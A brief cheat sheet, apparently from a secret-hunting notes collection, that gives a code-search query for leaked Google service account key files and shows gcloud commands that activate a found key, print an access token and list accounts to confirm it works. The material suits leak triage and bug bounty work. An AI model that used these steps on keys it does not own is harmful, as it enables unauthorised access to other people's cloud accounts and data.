# Google Cli Authen

## Search

```
path:service_account.json AND accounts.google.com AND private_key
```

## Exploit

```
$ cat service_account.json
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----...-----END PRIVATE KEY-----\n",
  "client_email": "...",
  "client_id": "...",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/..."
}
```

do

```
gcloud auth activate-service-account --key-file=service_account.json
Activated service account credentials for: [...]
gcloud auth print-access-token
ya29.c...
```

if get data , account is valid

List account

```
gcloud auth list
```
